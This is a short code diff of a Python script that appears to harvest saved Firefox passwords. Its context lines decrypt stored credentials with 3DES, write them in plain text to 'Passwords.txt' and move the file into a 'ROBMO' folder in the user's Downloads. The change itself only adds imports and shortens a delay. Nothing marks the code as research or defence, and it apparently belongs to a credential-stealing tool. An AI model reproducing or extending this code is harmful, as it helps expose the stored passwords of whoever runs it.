@@ -322,6 +322,8 @@ with open('Passwords.txt', 'w', encoding="utf-8") as f:
         f.write('𝐏𝐚𝐬𝐬𝐰𝐨𝐫𝐝: %s\n' % unpad(DES3.new(key, DES3.MODE_CBC, iv).decrypt(ciphertext), 8).decode())
         f.write('\n')
 
+import os
+import shutil
 
 download_folder = os.path.join(os.path.expanduser("~"), 'Downloads', 'ROBMO')
 
@@ -333,7 +335,7 @@ destination_path = os.path.join(firefox_folder, 'Passwords.txt')
 if not os.path.exists(firefox_folder):
     os.makedirs(firefox_folder)
 
-time.sleep(10)
+time.sleep(5)
 
 shutil.move(source_path, destination_path)
 
